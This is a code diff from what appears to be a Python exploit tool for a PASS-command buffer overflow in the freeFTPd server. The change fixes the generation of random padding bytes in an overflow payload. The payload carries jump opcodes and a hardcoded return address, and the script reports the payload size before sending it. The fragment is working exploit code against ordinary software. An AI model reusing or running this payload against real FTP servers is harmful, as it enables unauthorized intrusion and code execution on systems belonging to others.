@@ -72,11 +72,13 @@ class freeftpdPassOverflowMenu(cmd.Cmd):
     f.close()
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     for a in range(0, off - len(payload)):
-      payload += "\x" + char[randint(0, 16)] + char[randint(0, 16)]
+      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
+      payload += tmp.decode('string_escape')
     payload += "\xe9=\xfd\xff\xff"
     payload += "\xeb\xf9"
     for a in range(0, 2):
-      payload += "\x" + char[randint(0, 16)] + char[randint(0, 16)]
+      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
+      payload += tmp.decode('string_escape')
     payload += "\xbb\x14\x40\x00"
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
